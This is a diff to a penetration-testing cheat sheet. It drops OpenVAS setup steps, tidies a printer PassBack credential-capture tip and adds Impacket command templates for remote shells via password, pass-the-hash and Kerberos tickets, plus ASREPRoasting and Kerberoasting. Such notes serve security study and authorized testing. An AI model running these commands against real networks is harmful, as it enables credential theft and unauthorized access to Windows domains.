@@ -1083,26 +1083,6 @@ NSE scripts that scans for vulnerabilities are at `ls -l /usr/share/nmap/scripts
 * `nmap -p 21 --script=ftp-anon 192.168.1.0/24` - Scan entire network for FTP servers that allow anonymous access.
 * `nmap -p 80 --script=http-vuln-cve2010-2861 192.168.1.0/24` - Scan entire network for a directory traversal vulnerabilitiy. It can even retrieve admin's password hash.
 
-## The OpenVAS Vulnerability Scanner
-
-### OpenVAS Initial Setup
-`openvas-setup`
-
-Apparently, the program will fail. Thankfully, OpenVAS is already installed on the OffSec VM: https://forums.offensive-security.com/showthread.php?3216-05-2-1-Changes-to-quot-OpenVAS-Initial-Setup-quot-(openvas-setup)&p=12828#post12828 and https://forums.offensive-security.com/showthread.php?10139-OpenVas-Setup-issue&p=54721#post54721
-
-Just run the following commands to get it up and running.
-
-```sh
-openvasmd --user=admin --new-password=NEW_PASSWORD
-service redis-server start
-service greenbone-security-assistant start
-service openvas-scanner start
-service openvas-manager start
-firefox https://127.0.0.1:9392
-```
-
-Add new target -> add new scan using target -> run
-
 # Active Directory Pentesting
 
 ## Collecting Hashes with Responder
@@ -1140,9 +1120,82 @@ ntlmrelayx.py -6 -t ldaps:// ip of domain controller -wh fakewpad.marvel.local -
 
 ## PassBack Attack
  * check for printers and change the ip in access control to your own ip
-	*	set a listener on ldap port 389 with netcat or responder 
-	*	clear text passwords will be sent to you
+ * set a listener on ldap port 389 with netcat or responder 
+ * clear text passwords will be sent to you
 
+#Impacket
+##Obtain A Shell / Execute remote commands with a password
+* psexec.py
+```
+python psexec.py <domain_name>/<user_name>:<user_password>@<target_ip> 
+```
+* smbexec.py
+```
+python smbexec.py <domain_name>/<user_name>:<user_password@<target_ip>
+```
+* wmiexec.py
+```
+python wmiexec.py <domain_name>/<user_name>:@<target_ip>
+```
+Execute With Hashes
+* psexec.py
+```
+python psexec.py -hashes [lm_hash]:<ntlm_hash>  <user_name>@<target_ip> cmd.exe 
+```
+* smbexec.py
+```
+python smbexec.py -hashes [lm_hash]:<ntlm_hash> <user_name>@<target_ip> cmd.exe
+```
+* wmiexec.py
+```
+python wmiexec.py -hashes [lm_hash]:<ntlm_hash> <user_name>@<target_ip> cmd.exe
+```
+
+##ASREPRoast
+GetNPUsers.py
+* check ASREPRoast for all domain users (credentials required)
+```
+python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -output <output file>
+```
+* check ASREPRoast for a list of all users (no credentials required)
+```
+python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -output <output file>
+```
+##Kerberoasting
+GetUserSPNs.py
+```
+python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -output <output file>
+```
+##Over Pass The Hash / Pass The Key
+* Request the TGT with hash 
+```
+python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
+```
+* Request the TGT with aesKey 
+```
+python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
+```
+* Request the TGT with password 
+```
+python getTGT.py <domain_name>/<user_name>:[password]
+```
+* Set the TGT for impacket use
+```
+export KRB5CCNAME=<TGT_ccache_file>
+```
+Execute remote commands with any of the following by using the TGT
+psexec.py
+```
+python psexec.py <domain_name>/<user_name>@<target_ip> -k -no-pass
+```
+smbexec.py
+```
+python smbexec.py <domain_name>/<user_name>@<target_ip> -k -no-pass
+```
+wmiexec.py
+```
+python wmiexec.py <domain_name>/<user_name>@<target_ip> -k -no-pass
+```
 
 # File Transfers
 Antivirus may be triggered by an upload, so be careful when transferring files. One of OffSec's favourite ways to avoid AV is to use legitimate administrative tools during post exploitation phase.
